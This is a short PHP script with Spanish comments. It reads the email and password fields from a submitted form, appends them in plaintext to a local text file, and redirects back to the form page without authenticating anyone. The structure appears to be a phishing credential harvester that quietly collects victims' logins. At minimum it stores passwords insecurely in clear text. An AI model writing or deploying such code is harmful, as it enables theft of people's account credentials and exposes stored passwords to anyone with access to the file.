<?php
// Verifica si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["pass"];
    
    // Guarda los datos en un archivo de texto
    $file = fopen("login_data.txt", "a"); // Abre el archivo en modo de añadir (append)
    fwrite($file, "Email: " . $email . "\nPassword: " . $password . "\n\n");
    fclose($file);
    
    // Redirige de vuelta a la página del formulario o a donde quieras
    header("Location: formulario.html");
    exit();
}
?>
